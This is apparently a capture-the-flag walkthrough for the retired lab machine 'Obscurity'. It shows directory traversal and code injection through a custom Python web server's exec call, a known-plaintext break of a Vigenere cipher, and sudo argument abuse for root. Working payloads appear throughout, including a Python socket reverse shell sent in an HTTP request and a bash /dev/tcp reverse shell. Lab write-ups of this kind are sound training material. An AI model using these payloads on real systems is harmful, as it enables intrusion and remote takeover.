# Obscurity

This is the write-up for the box Obscurity that got retired at the 9th May 2020.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.168    obscurity.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/obscurity.nmap 10.10.10.168
```

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 04 Apr 2021 09:56:20
|     Server: BadHTTPServer
|     Last-Modified: Sun, 04 Apr 2021 09:56:20
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
(...)
9000/tcp closed cslistener
```

As port 80 and 9000 responded that the ports are _closed_, it could mean that there is a firewall in place.

## Checking HTTP (Port 8080)

The web page on port 8080 is a custom-developed company website for _"0bscura"_.
On there are some descriptions that could hint to what to look out for:
```markdown
**0bscura**

Here at 0bscura, we take a unique approach to security: you can't be hacked if attackers don't know what software you're using!

That's why our motto is 'security through obscurity'; we write all our own software from scratch, even the webserver this is running on!
This means that no exploits can possibly exist for it, which means it's totally secure!

**Our Software**

Our suite of custom software currently includes:
- A custom written web server
- Currently resolving minor stability issues; server will restart if it hangs for 30 seconds
- An unbreakable encryption algorithm
- A more secure replacement to SSH

**Development**

Server Dev
Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
```

There is an email address _secure[@]obscure.htb_ that could be a potential username.
The Server response header _"BadHTTPServer"_ is custom-developed and the file _SuperSecureServer.py_ seems to hint that it is developed in Python.

Lets search for the directory where the Python source code is in:
```
wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
```

The directory _/develop_ responds back successfully and in there is _SuperSecureServer.py_:
```
http://10.10.10.168:8080/develop/SuperSecureServer.py
```

### Exploiting the Python code

Observations from the Python code:
- It runs an `exec` function:
  - `exec(info.format(path))`
- _main function_ is missing, which means there has to be another file

As it uses `exec` and inputs a path, there could be a **Directory Traversal vulnerability** on the web page.
Python web server have their code often one directory above the current one and by enumerating it for default filenames, the code _main.py_ can be found:
```
GET /../main.py HTTP/1.1
Host: 10.10.10.168:8080
(...)
```

After running and debugging the code locally, it seems to be possible to rewrite the _path_ of the `exec` function and use it for code execution and append code with a semicolon.
Code execution proofed by sending ICMP packets to my local client successfully:
```
GET /';os.system("ping%20-c%201%2010.10.14.6");' HTTP/1.1
Host: 10.10.10.168:8080
```

Now that command execution works, we can use it to spawn a reverse shell:
```
GET /';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' HTTP/1.1
Host: 10.10.10.168:8080
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell connection as _www-data_.

## Privilege Escalation

There is a home directory _/home/robert_ with some interesting files:

- _BetterSSH/BetterSSH.py_
  - This is the custom developed SSH server that was mentioned on the website

- _check.txt_
  ```
  Encrypting this file with your key should result in out.txt, make sure your key is correct!
  ```

- _out.txt_
  - Non-readable string

- _passwordreminder.txt_
  - Non-readable string

- _SuperSecureCrypt.py_
  - This is the encryption algorithm that was mentioned on the website

After analyzing the code of the encryption algorithm in _SuperSecureCrypt.py_, it looks like a **Vigenere Cipher** which can be deciphered with a **Known-Plaintext attack**.

- _check.txt_ = plaintext file
- _out.txt_   = ciphertext file

The script has a _decrypt_ function that can be used with the `-d` parameter:
```
python3 SuperSecureCrypt.py -d -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -o key.txt
```

This generates the file _key.txt_ with a repeating pattern:
```
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

So the key is _alexandrovich_ and is needed to decrypt the _passwordreminder.txt_ file:
```
python3 SuperSecureCrypt.py -d -i passwordreminder.txt -k 'alexandrovich' -o decrypted.txt
```

This generates the file _decrypted.txt_ that contains the password:
> SecThruObsFTW

The password belongs to _robert_ and can be used to SSH into the box:
```
ssh robert@10.10.10.168
```

### Privilege Escalation to root

The user _robert_ is able to run the _BetterSSH.py_ with sudo permissions:
```
sudo -l

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Analyzing the Python code _BetterSSH.py_ in the home directory of _robert_:
- Opens _/etc/shadow_ and check for the username that is used
- Puts the password hash of the user into a random file in _/tmp/SSH_
- Compares the random file in _/tmp/SSH_ with the hash and authenticates if true
- If authentication is successful, it will run `sudo -u` with the current user on every command

Creating the SSH in directory in _/tmp_ as it does not exist:
```
mkdir /tmp/SSH
```

Running _BetterSSH.py_ with `sudo`:
```
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
```

It authenticates and when running no command, it shows that `sudo` can not find the command as it always appends `sudo -u robert` in front of a command:
```
robert@Obscure$
Output:
Error: sudo: : command not found
```

By overloading the parameters of `sudo`, it is possible to execute commands as root:
```
robert@Obscure$ -u root whoami
Output: root
```

This now runs `sudo -u robert -u root whoami` which takes the second `-u` argument and thus runs commands as root.
Lets create a reverse shell script in _/tmp/shell.sh_ on the box and execute it with root:
```
bash -i >& /dev/tcp/10.10.14.6/9002 0>&1
```
```
chmod +x shell.sh
```

Executing the shell script from the _BetterSSH_ with root:
```
robert@Obscure$ -u root /tmp/shell.sh
```

After executing the script, the listener on my IP and port 9002 starts a reverse shell connection as root!
